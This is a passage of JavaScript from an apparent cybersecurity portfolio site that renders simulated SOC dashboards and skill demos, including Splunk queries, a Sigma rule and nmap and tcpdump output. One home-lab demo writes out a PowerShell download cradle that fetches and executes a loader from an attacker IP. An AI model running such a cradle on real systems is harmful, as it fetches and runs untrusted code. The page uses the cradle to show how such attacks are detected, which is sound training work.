            <div class="cg-tile-body">Process: powershell.exe PID=4812<br>Remote: 192.168.56.103:443<br><span class="ioc">VT IP reputation: 12/92 malicious</span><br>Beaconing detected: 60s interval<br>C2 pattern: HTTP POST /check-in<br>ASN: AS-THREAT-ACTOR-2049</div>
          </div>
          <div class="cg-tile" data-tile="memory">
            <div class="cg-tile-head"><span>MEMORY FORENSICS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">PID 712 (svchost.exe)<br>SeDebugPrivilege: ENABLED<br><span class="ioc">Injected code: 0x1a400000</span><br>YARA in memory: mimikatz_signature<br>Strings: "sekurlsa::logonpasswords"<br>IOC: lsass.dmp handle open</div>
          </div>
          <div class="cg-tile" data-tile="ai">
            <div class="cg-tile-head"><span>AI ANALYSIS — DEEPSEEK</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body"><span class="ok">Verdict: MALICIOUS</span><br>Confidence: 94.7%<br>Risk score: 9.2/10<br>Threat type: Trojan + Credential Stealer<br>MITRE: T1059.001, T1003.001, T1053.005<br>Recommendation: isolate host, dump + analyze</div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="ai">
        <div class="sim-h">AI PROMPT + RESPONSE FLOW</div>
        <pre class="code-viewer"><span class="c">// ai_analysis/analyzer.py — analyze_detection()</span>

<span class="k">prompt</span> = <span class="s">"""
You are a senior malware analyst. Classify this detection:

DETECTION: IFEO Debugger Injection
RISK LEVEL: CRITICAL
FILE PATH: C:\\Windows\\Temp\\explorer.exe
REGISTRY KEY: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
YARA MATCHES: uac_bypass_eventvwr
VIRUSTOTAL: 41/72 detections
NETWORK: beacon to 192.168.56.103:443 every 60s

Map to MITRE ATT&CK. Recommend containment.
"""</span>

<span class="c"># Provider selection: DEEPSEEK (default) | OPENAI | GEMINI</span>
result = analyzer.analyze_detection(detection, <span class="k">provider</span>=AIProvider.DEEPSEEK)

<span class="c"># Returns AnalysisResult dataclass</span>
{
  <span class="s">"verdict"</span>:          <span class="s">"MALICIOUS"</span>,
  <span class="s">"confidence"</span>:       <span class="n">0.947</span>,
  <span class="s">"risk_score"</span>:      <span class="n">9.2</span>,
  <span class="s">"recommendations"</span>:  [<span class="s">"Isolate host"</span>, <span class="s">"Block C2 IP"</span>, <span class="s">"Run Volatility on RAM"</span>],
  <span class="s">"indicators"</span>:       [<span class="s">"192.168.56.103"</span>, <span class="s">"sha256:4f8c..."</span>],
  <span class="s">"mitre_techniques"</span>: [<span class="s">"T1548.002"</span>, <span class="s">"T1059.001"</span>, <span class="s">"T1003.001"</span>],
  <span class="s">"threat_type"</span>:      <span class="s">"Trojan.CredStealer"</span>
}</pre>
      </div>
    `;

    // animate tile scan states
    const tiles = $$('.cg-tile', host);
    tiles.forEach((t, i) => {
      t.classList.add('scanning');
      setTimeout(() => {
        t.classList.remove('scanning');
        const isThreat = !t.querySelector('[data-tile="ai"]');
        if (isThreat) t.classList.add('threat');
        else t.classList.add('clean');
      }, 800 + i * 600);
    });

    ctx.tabs = [
      { id: 'scan', label: '// Scan Output' },
      { id: 'ai',   label: '// AI Analysis' }
    ];
  };

  /* =================================================================
   *  7. HOME LAB — Attack Chain (same as soc-homelab but tabs differ)
   * ================================================================= */
  SIMS['homelab-attack-chain'] = (host, ctx) => {
    SIMS['soc-homelab'](host, ctx);
    // override header text
    const head = $('.sim-h', host);
    if (head) head.textContent = 'SOC + PENTEST HOME LAB — 9-PHASE ATTACK CHAIN';
  };

  /* =================================================================
   *  8. SKILL SIMULATIONS — keyed by skill name
   *     Renders a contextual mini-sim calibrated to the skill level
   * ================================================================= */
  const SKILL_SIMS = {};

  // Python (Intermediate) — code editor + output
  SKILL_SIMS['Python'] = (host) => {
    host.innerHTML = `
      <div class="skill-modal-grid">
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">process_scanner.py</span>
            <span class="skill-modal-lvl">INTERMEDIATE</span>
          </div>
          <pre class="code-viewer" style="max-height:300px"><span class="k">import</span> psutil, hashlib, yara

<span class="c"># Scan running processes, compute SHA256,</span>
<span class="c"># apply YARA rules, check VirusTotal.</span>

<span class="k">def</span> <span class="n">scan_processes</span>(yara_rules):
    findings = []
    <span class="k">for</span> proc <span class="k">in</span> psutil.process_iter([<span class="s">'pid'</span>, <span class="s">'name'</span>,
                                       <span class="s">'exe'</span>, <span class="s">'cmdline'</span>]):
        <span class="k">try</span>:
            sha = sha256_of(proc.info[<span class="s">'exe'</span>])
            matches = yara_rules.match(proc.info[<span class="s">'exe'</span>])
            <span class="k">if</span> matches:
                findings.append({
                    <span class="s">'pid'</span>: proc.info[<span class="s">'pid'</span>],
                    <span class="s">'name'</span>: proc.info[<span class="s">'name'</span>],
                    <span class="s">'sha256'</span>: sha,
                    <span class="s">'matches'</span>: [m.rule <span class="k">for</span> m <span class="k">in</span> matches]
                })
        <span class="k">except</span> (psutil.NoSuchProcess, psutil.AccessDenied):
            <span class="k">continue</span>
    <span class="k">return</span> findings

<span class="k">def</span> <span class="n">sha256_of</span>(path):
    h = hashlib.sha256()
    <span class="k">with</span> <span class="k">open</span>(path, <span class="s">'rb'</span>) <span class="k">as</span> f:
        <span class="k">for</span> chunk <span class="k">in</span> iter(<span class="k">lambda</span>: f.read(8192), b<span class="s">''</span>):
            h.update(chunk)
    <span class="k">return</span> h.hexdigest()</pre>
        </div>
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">output</span>
            <span class="skill-modal-lvl" style="border-color:var(--neon-2);color:var(--neon-2)">DEMO RUN</span>
          </div>
          <div class="term" id="py-out"></div>
        </div>
      </div>
      <div class="sim-p" style="margin-top:14px">Demonstrates intermediate-level Python: OOP-style organization, exception handling (NoSuchProcess, AccessDenied), file binary I/O in chunks, hashlib + YARA integration. Same pattern as CyberGuardian's <span class="code-inline">scanners/process_scanner.py</span>.</div>
    `;
    attachTerminal($('#py-out', host), [
      '$ python3 process_scanner.py',
      '[*] Loading YARA rules from data/yara_rules/...',
      '[+] 12 rules loaded',
      '[*] Enumerating processes...',
      '[+] PID 412 (svchost.exe) sha=4f8c...e201 [clean]',
      '[!] PID 712 (svchost.exe) sha=ab12...9f3d matches: malware_loader',
      '[+] VirusTotal: 38/72 detections',
      '[!] PID 1288 (powershell.exe) cmdline contains IEX (DownloadString)',
      '[*] Scan complete: 2 suspicious processes found'
    ], { speed: 18, linePause: 200 });
  };

  // Wireshark (Advanced) — packet capture inspector
  SKILL_SIMS['Wireshark'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">WIRESHARK — PACKET CAPTURE INSPECTION (Advanced)</div>
      <div class="sim-p">Deep packet inspection & multi-protocol decode. Mock of the disassembly view used at Sagemcom/LibertyGlobal to triage protocol-level anomalies on ISP gateway products.</div>
      <pre class="code-viewer" style="max-height:360px">
No.  Time       Source           Destination      Protocol  Length  Info
1    0.000000   192.168.1.10     192.168.1.1      DHCP      314     DHCP Discover - Transaction ID 0x4a92
2    0.001234   192.168.1.1      192.168.1.10     DHCP      328     DHCP Offer    - Server ID 192.168.1.1, Yiaddr 192.168.1.42
3    0.001812   192.168.1.10     192.168.1.1      DHCP      314     DHCP Request  - Requested IP 192.168.1.42
4    0.002019   192.168.1.1      192.168.1.10     DHCP      328     DHCP ACK      - Yiaddr 192.168.1.42

5    0.523411   192.168.1.42     8.8.8.8          DNS       78      Standard query 0x0001 A api.axa.fr
6    0.529812   8.8.8.8          192.168.1.42     DNS       110     Standard response 0x0001 A 93.184.216.34

7    1.234000   192.168.1.42     93.184.216.34    TLS       517     Client Hello (SNI=api.axa.fr)
8    1.287921   93.184.216.34    192.168.1.42     TLS       1452    Server Hello, Certificate, Server Hello Done
9    1.298012   192.168.1.42     93.184.216.34    TLS       134     Client Key Exchange, Change Cipher Spec, Finished

<span style="color:var(--neon-3)">>>> 10   2.512821   192.168.1.42     192.168.56.103   TLS       517     *** ANOMALY: TLS to internal attacker IP ***</span>
<span style="color:var(--neon-3)">>>> 11   2.572001   192.168.56.103  192.168.1.42     TLS       1452    *** C2 Beacon response — 60s interval ***</span>
<span style="color:var(--neon-4)">>>> 12   2.581234   192.168.1.42     239.255.255.250  SSDP     312     *** Suspicious multicast discovery ***</span>

13   3.123821   192.168.1.42     192.168.1.1      ARP       60      Who has 192.168.1.1? Tell 192.168.1.42
14   3.124012   192.168.1.1      192.168.1.42     ARP       60      192.168.1.1 is at 00:1a:2b:3c:4d:5e

15   4.001812   fe80::1         ff02::2          ICMPv6    70      Router Solicitation
16   4.005012   fe80::1         fe80::42         ICMPv6    86      Router Advertisement

[ Filter: tls or dns or dhcp  — 16 packets / 0.4s capture ]
[ Status: 2 critical anomalies flagged, 1 warning ]</pre>
    `;
  };

  // Splunk SPL (Intermediate)
  SKILL_SIMS['Splunk SPL'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">SPLUNK SPL — Detection Queries (Intermediate)</div>
      <div class="sim-p">Hands-on usage from HTB CDSA exam, TryHackMe SOC Level 2 path, and home lab. Three real queries I authored for the privilege-escalation phase (UAC bypass via eventvwr.exe).</div>
      <pre class="code-viewer" style="max-height:340px"><span class="c">// Query 1 — Registry modification for UAC bypass (Sysmon Event ID 13)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">13</span>
  TargetObject=<span class="s">"*mscfile*"</span>
| table _time, Message

<span class="c">// Query 2 — eventvwr.exe execution (Sysmon Event ID 1)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">1</span>
  ParentImage=<span class="s">"*eventvwr.exe*"</span>
| table _time, Message

<span class="c">// Query 3 — Proof file was created (Security 4656 OR 4663)</span>
index=main sourcetype=<span class="s">"WinEventLog:Security"</span>
  (EventCode=<span class="n">4656</span> OR EventCode=<span class="n">4663</span>)
  ObjectName=<span class="s">"*msfile*"</span>
| table _time, Message</pre>
    `;
  };

  // Nmap (Advanced)
  SKILL_SIMS['Nmap'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">NMAP — ADVANCED SCAN SUITE</div>
      <div class="sim-p">Used at Sagemcom + LibertyGlobal to fingerprint gateway attack surface and validate firewall behaviour. Below: scripted TCP SYN + service detection + vulnerability script scan against a typical XGS-PON gateway.</div>
      <div class="term" id="nmap-out"></div>
    `;
    attachTerminal($('#nmap-out', host), [
      '$ nmap -sS -sV --version-intensity 5 -O --traceroute -p1-65535 192.168.1.1',
      'Starting Nmap 7.94 ( https://nmap.org )',
      'Nmap scan report for 192.168.1.1',
      'Host is up (0.0042s latency).',
      'Not shown: 65530 closed tcp ports',
      'PORT     STATE SERVICE    VERSION',
      '22/tcp   open  ssh        OpenSSH 7.6 (protocol 2.0)  ← DEFAULT OPEN!',
      '23/tcp   open  telnet     BusyBox telnetd',
      '53/tcp   open  domain     dnsmasq 2.78',
      '80/tcp   open  http       lighttpd 1.4.59 (Web GUI)',
      '443/tcp  open  ssl/http   lighttpd 1.4.59',
      '5060/tcp open  sip        Kamailio 5.3 (VoIP)',
      '7547/tcp open  cwmp       TR-069 CWMP (FREMT) ←  CVE potential',
      '',
      'Device type: broadband gateway',
      'OS: Linux 4.9 (ARM)',
      'Network Distance: 1 hop',
      '',
      '$ nmap --script vuln,banner,fingerprint -p 22,80,443,7547 192.168.1.1',
      '|_http-vuln-cve2017-5638: Apache Struts RCE — N/A',
      '|_http-enum: /admin/ (potential admin panel)',
      '|_ssl-ccs-injection: No',
      '|_ssl-heartbleed: vulnerable  ← CRITICAL FINDING',
      '|_telnet-brute: login "admin/admin" — SUCCESS  ← CRITICAL FINDING',
      '',
      '$ nmap --script firewall-bypass,firewalk 192.168.1.1',
      '| firewalk: scanned 200 ports, 12 reachable through ACL',
      '|_firewall-bypass: 6 ports reachable via IPID spoofing'
    ], { speed: 14, linePause: 100 });
  };

  // tcpdump (Advanced)
  SKILL_SIMS['tcpdump'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">TCPDUMP — LIVE CAPTURE</div>
      <div class="sim-p">Used at Sagemcom/LibertyGlobal to capture & analyse protocol-level traffic on CPE gateway interfaces. Below: live capture of a DHCP DORA sequence + DNS lookup + a suspicious beacon.</div>
      <div class="term" id="tcp-out"></div>
    `;
    attachTerminal($('#tcp-out', host), [
      '# tcpdump -i eth0 -nn -vv -X port 67 or port 68 or port 53 or port 443',
      'tcpdump: verbose output',
      '',
      '14:01:22.413921 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request, length 314',
      '    Client-Ethernet-Addr: 00:1a:2b:3c:4d:5e',
      '    Option (53) DHCP Discover',
      '14:01:22.421812 IP 192.168.1.1.67 > 192.168.1.42.68: BOOTP/DHCP, Reply, length 328',
      '    Option (53) DHCP Offer, Server-ID 192.168.1.1, Yiaddr 192.168.1.42',
      '14:01:22.423000 IP 0.0.0.0.68 > 192.168.1.1.67: BOOTP/DHCP, Request',
      '    Option (50) Requested-IP 192.168.1.42',
      '14:01:22.424018 IP 192.168.1.1.67 > 192.168.1.42.68: BOOTP/DHCP, ACK',
      '',
      '14:01:23.512000 IP 192.168.1.42.51114 > 8.8.8.8.53: 1234+ A? api.axa.fr.',
      '14:01:23.519000 IP 8.8.8.8.53 > 192.168.1.42.51114: 1234 1/0/0 A 93.184.216.34',
      '',
      '!!! 14:01:24.512000 IP 192.168.1.42.49213 > 192.168.56.103.443: Flags [P.], seq 1:468, ack 1, win 502',
      '!!! Suspicious: TLS handshake to attacker IP (192.168.56.103)',
      '!!! Pattern: every 60.0s — C2 beacon detected',
      '',
      '# filter: tcpdump -nn "tcp port 443 and host 192.168.56.103"',
      '# capture saved to /tmp/beacon.pcap for Splunk ingestion'
    ], { speed: 14, linePause: 110 });
  };

  // MITRE ATT&CK (Intermediate)
  SKILL_SIMS['MITRE ATT&CK'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">MITRE ATT&CK — MAPPING WORKFLOW</div>
      <div class="sim-p">7-step methodology I use to map detections to MITRE ATT&CK (applied in HTB CDSA exam + home lab).</div>
      <ol style="padding:0;list-style:none;font-size:12px;color:var(--fg-soft);line-height:2">
        <li><span class="chain-no">01</span> Understand what the detection actually looks for</li>
        <li><span class="chain-no">02</span> Find the core attacker action</li>
        <li><span class="chain-no">03</span> Search MITRE ATT&CK (technique or sub-technique)</li>
        <li><span class="chain-no">04</span> Choose the best technique (T1548.002 for UAC bypass)</li>
        <li><span class="chain-no">05</span> Add the label to the detection rule (Sigma rule)</li>
        <li><span class="chain-no">06</span> Validate with another person or a test</li>
        <li><span class="chain-no">07</span> Keep it updated over time</li>
      </ol>
      <div class="sim-h" style="margin-top:14px">EXAMPLE — HOME LAB MAPPING</div>
      <pre class="code-viewer" style="max-height:200px"><span class="k">detection</span>: scheduled task with name SystemHealthMonitor
<span class="c"># Step 1: detection looks for schtasks /create with suspicious name</span>
<span class="c"># Step 2: core action = persistence via scheduled task</span>
<span class="c"># Step 3: search ATT&CK → T1053 (Scheduled Task/Job)</span>
<span class="c"># Step 4: sub-technique T1053.005 (Scheduled Task)</span>
<span class="c"># Step 5: add tag "attack.t1053.005" to Sigma rule</span>
<span class="c"># Step 6: validated by re-running the attack + detection</span>
<span class="c"># Step 7: review monthly for new sub-techniques</span></pre>
    `;
  };

  // PowerShell (Intermediate)
  SKILL_SIMS['PowerShell'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">POWERSHELL — SCRIPTED ATTACK SIMULATION (Intermediate)</div>
      <div class="sim-p">From the home lab — Phase 2 PowerShell download cradle used to trigger detections.</div>
      <pre class="code-viewer" style="max-height:340px"><span class="c"># phase2_powershell_download_cradle.ps1</span>
<span class="c"># Auto_Open VBA macro spawns this hidden PowerShell.</span>

<span class="k">$ErrorActionPreference</span> = <span class="s">"SilentlyContinue"</span>

<span class="c"># Hidden window, execution policy bypassed</span>
<span class="k">Invoke-Expression</span> (<span class="k">New-Object</span> Net.WebClient).DownloadString(
  <span class="s">"http://192.168.56.103:8080/loader.ps1"</span>
)

<span class="c"># loader.ps1 content (compressed + base64 payload)</span>
<span class="k">$s</span> = <span class="k">New-Object</span> IO.Compression.GzipStream(
  (<span class="k">New-Object</span> IO.MemoryStream(,
    [Convert]::FromBase64String(<span class="s">"H4sIA..."</span>))),
  [IO.Compression.CompressionMode]::Decompress
)
<span class="k">$sr</span> = <span class="k">New-Object</span> IO.StreamReader(<span class="k">$s</span>)
<span class="k">Invoke-Expression</span> <span class="k">$sr</span>.ReadToEnd()

<span class="c"># Detection:</span>
<span class="c"># Sysmon Event ID 1 — Image=powershell.exe, CommandLine contains</span>
<span class="c"># "-ExecutionPolicy Bypass" AND "DownloadString"</span>
<span class="c"># Sigma rule: win_powershell_download_cradle.yml</span>
<span class="c"># MITRE: T1059.001</span></pre>
    `;
  };

  // Sigma Rule Authoring (Intermediate)
  SKILL_SIMS['Sigma Rule Authoring'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">SIGMA — PERSISTENCE RULE (T1053.005)</div>
      <div class="sim-p">One of the Sigma rules I authored for the home lab — detects scheduled tasks created with suspicious names.</div>
      <pre class="code-viewer" style="max-height:380px"><span class="k">title</span>: <span class="s">Scheduled Task Creation for Persistence</span>
<span class="k">id</span>: <span class="s">4d5e6f7a-8b9c-0123-defa-234567890123</span>
<span class="k">status</span>: <span class="s">production</span>
<span class="k">description</span>: <span class="c"># Detects scheduled tasks that may be used for persistence. Monitors Security Event ID 4698 and Task Scheduler Event ID 106.</span>
<span class="k">references</span>:
  - <span class="s">https://attack.mitre.org/techniques/T1053/005/</span>
<span class="k">author</span>: <span class="s">SOC Home Lab Project Alpha</span>
<span class="k">date</span>: <span class="s">2024/09/12</span>
<span class="k">tags</span>:
  - <span class="s">attack.persistence</span>
  - <span class="s">attack.t1053.005</span>
<span class="k">logsource</span>:
  <span class="k">product</span>: <span class="s">windows</span>
  <span class="k">service</span>: <span class="s">security</span>
<span class="k">detection</span>:
  <span class="k">selection_4698</span>:
    <span class="k">EventID</span>: <span class="n">4698</span>
  <span class="k">selection_106</span>:
    <span class="k">EventID</span>: <span class="n">106</span>
    <span class="k">Source</span>: <span class="s">Microsoft-Windows-TaskScheduler</span>
  <span class="k">suspicious_names</span>:
    <span class="k">TaskName|contains</span>:
      - <span class="s">SystemHealth</span>
      - <span class="s">Updater</span>
      - <span class="s">Monitor</span>
      - <span class="s">Update</span>
      - <span class="s">WindowsUpdate</span>
  <span class="k">condition</span>: <span class="s">(selection_4698 or selection_106) and suspicious_names</span>
<span class="k">falsepositives</span>:
  - <span class="s">Legitimate software installation creating scheduled update tasks</span>
  - <span class="s">System administration scripts with similar naming patterns</span>
<span class="k">level</span>: <span class="s">medium</span></pre>
    `;
  };

  // Jira (Advanced) — bug ticket view
  SKILL_SIMS['Jira'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">JIRA — BUG TICKET TEMPLATE (Advanced)</div>
      <div class="sim-p">The exact ticket structure I used at Sagemcom and LibertyGlobal for 800+ findings.</div>
      <pre class="code-viewer" style="max-height:380px"><span class="k">Ticket</span>: <span class="s">KDG-2018-0917</span>
<span class="k">Title</span>: <span class="s">Factory reset causes infinite boot loop on KDG DOCSIS 3.1</span>
<span class="k">Product</span>: <span class="s">KDG DOCSIS 3.1 broadband gateway</span>
<span class="k">Firmware</span>: <span class="s">v2.4.1-rc3 (pre-release)</span>
<span class="k">Severity</span>: <span class="n">CRITICAL</span>
<span class="k">CVSS</span>: <span class="n">8.0</span>
<span class="k">Reproducibility</span>: <span class="s">Always (100%)</span>
<span class="k">Category</span>: <span class="s">Functional / Availability</span>

<span class="k">Description</span>:
<span class="c">Performing a factory reset from the GUI or from SNMP management</span>
<span class="c">pushes the gateway into an infinite reboot loop, bricking the device.</span>

<span class="k">Steps to Reproduce</span>:
1. Login to GUI as admin
2. Navigate to Administration > Factory Reset
3. Click "Restore Defaults"
4. Wait for reboot
5. Observe: gateway enters infinite reboot cycle

<span class="k">Environment</span>:
- Hardware: KDG-DC3.1-Gateway
- Firmware: v2.4.1-rc3
- Test bench: Sagemcom Lab, isolated bench 4
- Tools used: GUI + SNMP management tool

<span class="k">Logs</span>:
- boot_cycle.log (full serial console capture)
- screenshots_5_attached.zip
- snmp_capture.pcap

<span class="k">Impact</span>:
<span class="c">Mass customer impact if shipped — hundreds/thousands of subscribers</span>
<span class="c">would brick their gateways. Manual recovery for each one.</span>

<span class="k">Remediation Proposal</span>:
<span class="c">1. During the boot loop, interrupt the boot process from the CLI</span>
<span class="c">2. Perform a manual firmware upgrade to the same version</span>
<span class="c">3. Only after upgrade does the gateway reboot and operate normally</span>

<span class="k">Traceability</span>:
- Requirement: REQ-KDG-2018-117
- Test cases: TC-KDG-2018-117-01 (GUI), TC-KDG-2018-117-02 (SNMP)
- ISO 27001:2022 Annex A control: A.8.9, A.8.10</pre>
    `;
  };

  // Docker (Intermediate)
  SKILL_SIMS['Docker'] = (host) => {
    host.innerHTML = `
      <div class="sim-h">DOCKER — LIBERTYGLOBAL TEST PLATFORM</div>
      <div class="sim-p">At LibertyGlobal, the test platform used Docker containers to simulate gateway clients (laptops, desktops, tablets, WiFi clients, management). Below: a typical XGS-PON test run using docker-compose.</div>
      <pre class="code-viewer" style="max-height:340px"><span class="c"># docker-compose.yml — XGS-PON test bench</span>
<span class="k">version</span>: <span class="s">'3.8'</span>
<span class="k">services</span>:

  <span class="k">lan-client-1</span>:
    image: <span class="s">libertyglobal/test-client:latest</span>
    network_mode: <span class="s">"bridge:lan-net"</span>
    environment:
      - ROLE=desktop
      - DHCP=true
    cap_add: [NET_ADMIN]

  <span class="k">lan-client-2</span>:
    image: <span class="s">libertyglobal/test-client:latest</span>
    network_mode: <span class="s">"bridge:lan-net"</span>
    environment:
      - ROLE=tablet

  <span class="k">wifi-client-2g</span>:
    image: <span class="s">libertyglobal/wifi-client:latest</span>
    environment:
      - BAND=2.4GHz
      - SSID=LG-Home

  <span class="k">voip-client</span>:
    image: <span class="s">libertyglobal/sip-client:kamailio-5.3</span>
    environment:
      - SIP_URI=sip:2001@lg-voice.local

  <span class="k">management</span>:
    image: <span class="s">libertyglobal/tr069-mgmt:latest</span>
    ports: [<span class="s">"7547:7547"</span>]

<span class="c"># Run:</span>
<span class="c"># $ docker-compose up -d</span>
<span class="c"># $ ./run-tests.sh --product xgs-pon --suite functional</span>
<span class="c"># $ ./run-tests.sh --product xgs-pon --suite security</span></pre>
    `;
  };

  // =========================================================================
  //  SKILL MODAL — 3-tab structure (Sources / Proficiency / Live Simulation)
  //  Every skill gets this structure regardless of whether a specific
  //  SKILL_SIMS[key] renderer exists. Specific renderers populate only the
  //  Live Simulation tab; generic skills get a level-calibrated live sim.
  // =========================================================================
  function levelDescriptor(lvl) {
    switch (lvl) {
      case 'beginner':     return 'Aware of the tool, can execute basic operations with documentation, still learning the workflow.';
      case 'intermediate': return 'Comfortable in production-like environments, can troubleshoot independently, contributes to team knowledge.';
      case 'advanced':     return 'Owns end-to-end workflows, trains others, makes architecture decisions, handles edge cases.';
      case 'expert':       return 'Recognised authority, sets standards, reviews others\' work, handles novel scenarios.';
      default:             return '—';
    }
  }

  function escapeHtmlS(s) {
    return String(s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  // ---- Tab 1: SOURCES ----
  function renderSourcesSection(skill) {
    const cap = (skill.level || '').toUpperCase();
    const pct = skill.percent;
    return `
      <div class="skill-modal-grid">
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">${escapeHtmlS(skill.name)}</span>
            <span class="skill-modal-lvl">${cap}</span>
          </div>
          <div class="sim-p">Proficiency self-assessed at <strong style="color:var(--neon)">${cap.charAt(0) + cap.slice(1).toLowerCase()}</strong> (${pct}%). Demonstrated via the following sources:</div>
          <ul class="skill-sources-list">
            ${skill.sources.map(s => `<li><span class="src-mark">▸</span> ${escapeHtmlS(s)}</li>`).join('')}
          </ul>
          <div class="sim-p" style="margin-top:14px;font-size:11px;color:var(--fg-dim);line-height:1.6">
            <strong style="color:var(--neon-2)">Level meaning:</strong><br>
            ${levelDescriptor((skill.level || '').toLowerCase())}
          </div>
        </div>
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">where this skill was applied</span>
          </div>
          <div class="sim-p" style="font-size:12px;color:var(--fg-soft);line-height:1.7">
            Each source above corresponds to a concrete environment where the skill was exercised:
          </div>
          <ul class="source-context-list">
            ${skill.sources.map(src => {
              const ctx = sourceContext(src);
              return `<li><strong style="color:var(--neon-2)">${escapeHtmlS(src)}</strong><br><span style="color:var(--fg-dim);font-size:11px">${ctx}</span></li>`;
            }).join('')}
          </ul>
        </div>
      </div>
    `;
  }

  function sourceContext(src) {
    const map = {
      'Sagemcom':      'Protocol-level vulnerability testing on ISP broadband gateways (BBox3, Vodafone, KDG, TalkTalk, Telia, KPN) — 5 years, 800+ findings.',
      'LibertyGlobal': 'Senior vulnerability analysis on DOCSIS 3.0/3.1 Cable + XGS-PON Fibre products — 3 years, led team of 8 on XGS-PON.',
      'Capgemini':     'Mobile & web test automation for AXA Assurance France (iOS/Android) — Selenium, Appium, Azure DevOps, shift-left security.',
      'TryHackMe':     '400+ hands-on rooms completed, top 1% globally (rank ~2637). SOC Level 1 & 2 paths, Jr Penetration Tester path.',
      'HTB':           'HackTheBox defensive & offensive labs — SOC, forensics, and detection engineering hands-on practice.',
      'HTB CDSA':      'HackTheBox Certified Defensive Security Analyst exam — full attack-chain reconstruction, Splunk SPL, Sigma rules.',
      'Home Lab':      'Personal SOC + Pentest home lab (VirtualBox: DC, victim, web server, attacker Kali) — 9-phase attack chain with detections.',
      'Udemy':         'Self-authored 16-course cybersecurity curriculum on Udemy — 1,100+ students enrolled.'
    };
    return map[src] || 'Hands-on practice and applied exercises.';
  }

  // ---- Tab 2: PROFICIENCY RADAR ----
  function renderRadarSection(skill) {
    const lvl = (skill.level || '').toLowerCase();
    const pct = skill.percent;
    const cap = lvl.charAt(0).toUpperCase() + lvl.slice(1);
    const tiers = [
      { label: 'Newbie',     pct: 20 },
      { label: 'Basic',      pct: 40 },
      { label: 'Working',    pct: 60 },
      { label: 'Pro',        pct: 80 },
      { label: 'Expert',     pct: 100 }
    ];
    return `
      <div class="radar-wrap">
        <div class="skill-modal-head" style="margin-bottom:16px">
          <span class="skill-modal-name">${escapeHtmlS(skill.name)} — proficiency radar</span>
          <span class="skill-modal-lvl">${cap.toUpperCase()}</span>
        </div>
        <div class="radar-bars">
          ${tiers.map((t, i) => {
            const active = t.pct <= pct;
            const isCurrent = (i === Math.floor(pct / 20) - (pct % 20 === 0 ? 1 : 0)) || (pct === 100 && i === tiers.length - 1);
            return `
              <div class="radar-bar ${active ? 'active' : ''} ${isCurrent ? 'current' : ''}">
                <div class="radar-bar-fill" style="height:${active ? Math.max(20, t.pct) : 8}px"></div>
                <div class="radar-bar-lbl">${t.label}</div>
                <div class="radar-bar-pct">${t.pct}%</div>
              </div>
            `;
          }).join('')}
        </div>
        <div class="radar-summary">
          <div class="radar-summary-line">
            <span class="rs-key">CURRENT_LEVEL</span>
            <span class="rs-val" style="color:var(--neon)">${cap}</span>
          </div>
          <div class="radar-summary-line">
            <span class="rs-key">MASTERY_PCT</span>
            <span class="rs-val">${pct}%</span>
          </div>
          <div class="radar-summary-line">
            <span class="rs-key">NEXT_MILESTONE</span>
            <span class="rs-val" style="color:var(--neon-2)">${nextMilestone(pct, cap)}</span>
          </div>
        </div>
        <div class="radar-descriptor">
          <strong style="color:var(--neon-2)">Simulation calibrated to level:</strong>
          <span>${levelDescriptor(lvl)}</span>
        </div>
      </div>
    `;
  }

  function nextMilestone(pct, cap) {
    if (pct >= 100) return 'Maintain and teach others';
    if (pct >= 80)  return 'Expert (100%) — set standards, review peers';
    if (pct >= 60)  return 'Advanced (80%) — own end-to-end workflows';
    if (pct >= 40)  return 'Pro (60%) — troubleshoot independently';
    if (pct >= 20)  return 'Working (40%) — comfortable in production';
    return 'Basic (20%) — operate with documentation';
  }

  // ---- Tab 3: LIVE SIMULATION (generic, level-calibrated) ----
  // Used when no specific SKILL_SIMS[key] exists. Generates a realistic
  // work-environment CLI/config/activity simulation mentioning the skill.
  function genericLiveSim(skill, host) {
    const lvl = (skill.level || '').toLowerCase();
    const cap = lvl.charAt(0).toUpperCase() + lvl.slice(1);
    const name = skill.name;
    const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, '_');

    // The simulation scenario scales with level:
    //   beginner     → guided exploration
    //   intermediate → typical daily workflow
    //   advanced     → multi-step investigation with findings
    //   expert       → complex scenario + remediation + mentoring note
    const scenario = buildScenario(name, lvl);
    host.innerHTML = `
      <div class="sim-h">${escapeHtmlS(name).toUpperCase()} — LIVE SIMULATION (${cap.toUpperCase()})</div>
      <div class="sim-p">${scenario.intro}</div>
      ${scenario.preBlock || ''}
      <div class="term" id="generic-live-${slug}"></div>
      ${scenario.postBlock || ''}
      <div class="sim-p" style="margin-top:14px;font-size:11px;color:var(--fg-dim);line-height:1.6">
        <strong style="color:var(--neon-2)">Level calibration:</strong> ${levelDescriptor(lvl)}
      </div>
    `;
    attachTerminal($('#generic-live-' + slug, host), scenario.lines, { speed: 14, linePause: 110 });
  }

  // Build a level-appropriate scenario (CLI lines + intro + optional blocks)
  function buildScenario(name, lvl) {
    const t = ts();
    // Base scenario per level
    if (lvl === 'beginner') {
      return {
        intro: `Guided exploration of <strong>${escapeHtmlS(name)}</strong> — beginner workflow with documentation support.`,
        lines: [
          `$ # ${name} — beginner walkthrough`,
          `$ man ${name.toLowerCase().replace(/\s+/g, '-')}`,
          '[doc] NAME',
          `[doc]   ${name} — overview and basic usage`,
          '[doc] SYNOPSIS',
